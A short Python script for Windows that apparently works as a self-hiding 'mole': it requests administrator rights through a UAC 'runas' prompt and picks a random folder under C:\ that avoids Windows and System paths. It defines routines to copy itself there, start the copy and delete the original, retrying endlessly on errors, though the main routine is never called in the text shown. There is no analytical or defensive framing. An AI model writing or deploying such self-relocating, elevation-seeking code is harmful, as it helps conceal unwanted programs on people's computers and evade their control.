times = 0
PATH = ''
import sys
import subprocess
import ctypes
import os
import random


if ctypes.windll.shell32.IsUserAnAdmin():
    pass
else:
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, __file__, None, 1)
    sys.exit()


times = times+1
this = __file__


def random_path():
    dictionary = []
    for x, y in enumerate(os.walk(os.path.expanduser('C:\\'))):
        dictionary.append(y)
    return random.choice(dictionary)[0]


next_path = random_path()+"\\mole"+str(times)+".py"
while(('Windows'in next_path)or('System'in next_path)):
    next_path = random_path()+"\\mole"+str(times)+".py"
print(next_path)


def self_copy():
    with open(__file__, 'r')as this_file:
        this = this_file.readlines()[2:]
    temp = ''
    for x in this:
        temp = temp+x
    this = temp
    with open(next_path, 'w')as file:
        file.write('times=%s\nPATH=r"%s"\n%s' % (times, __file__, this))


def change():
    try:
        self_copy()
    except:
        change()
    else:
        print('this is the %s mole!, at %s' %((times-1), os.path.abspath(__file__)))
    try:
        subprocess.Popen('python '+next_path)
    except:
        change()
    else:
        os.remove(__file__)
